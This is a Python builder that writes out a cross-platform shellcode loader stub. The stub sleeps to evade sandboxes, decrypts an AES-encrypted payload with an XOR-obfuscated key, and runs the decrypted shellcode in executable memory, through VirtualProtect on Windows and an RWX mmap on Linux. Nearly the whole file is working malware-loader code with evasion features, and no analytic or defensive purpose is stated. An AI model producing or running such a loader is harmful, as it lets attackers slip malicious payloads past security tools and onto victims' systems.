import binascii
import platform

STUB_TEMPLATE = """#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import binascii
import ctypes
import platform
import mmap
import sys
import time

# Anti-Sandbox: Delay execution
time.sleep(3)

# Obfuscated Components
obfuscated_key = binascii.unhexlify("{obfuscated_key_hex}")
xor_key = binascii.unhexlify("{xor_key_hex}")
encrypted_file = "{encrypted_file}"

def xor_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def decrypt_payload():
    # Decrypt AES Key
    aes_key = xor_decrypt(obfuscated_key, xor_key)

    # Read and decrypt payload
    with open(encrypted_file, "rb") as f:
        encrypted_data = f.read()
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)

    # Debug: Save decrypted payload
    with open("decrypted.bin", "wb") as f:
        f.write(decrypted)
    return decrypted

def execute_windows(shellcode):
    try:
        buffer = ctypes.create_string_buffer(shellcode)
        ctypes.windll.kernel32.VirtualProtect(
            buffer, len(shellcode), 0x40, ctypes.byref(ctypes.c_ulong(0)))
        func = ctypes.cast(buffer, ctypes.CFUNCTYPE(None))
        func()
    except Exception as e:
        print(f"[!] Windows execution failed: {e}")
        sys.exit(1)

def execute_linux(shellcode):
    try:
        # Create RWX memory
        mem = mmap.mmap(-1, len(shellcode),
                        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        mem.write(shellcode)

        # Cast to function
        ctypes_buffer = ctypes.c_char.from_buffer(mem)
        function = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes_buffer))
        function()
    except Exception as e:
        print(f"[!] Linux execution failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    print("[*] Starting cross-platform payload executor")
    print(f"[*] Detected OS: {platform.system()}")

    try:
        decrypted = decrypt_payload()
        print(f"[+] Payload decrypted ({len(decrypted)} bytes)")

        if platform.system() == "Windows":
            execute_windows(decrypted)
        elif platform.system() == "Linux":
            execute_linux(decrypted)
        else:
            print(f"[!] Unsupported OS: {platform.system()}")
            sys.exit(1)

    except Exception as e:
        print(f"[!] Critical error: {e}")
        print("[*] Decrypted payload saved to 'decrypted.bin'")
        sys.exit(1)
"""


def generate_decryptor(encrypted_file, obfuscated_key_hex, xor_key_hex):
    with open("decryptor.py", "w") as f:
        f.write(STUB_TEMPLATE.format(
            obfuscated_key_hex=obfuscated_key_hex,
            xor_key_hex=xor_key_hex,
            encrypted_file=encrypted_file
        ))

    # Make executable on Linux
    if platform.system() == "Linux":
        import os
        os.chmod("decryptor.py", 0o755)

    print("[+] Cross-platform decryptor generated:")
    print(f"    - File: decryptor.py")
    print(f"    - XOR Key: {xor_key_hex}")
    print(f"    - Target: {encrypted_file}")

# Example usage:
# generate_decryptor("encrypted.bin", "1a2b3c...", "4d5e6f...")
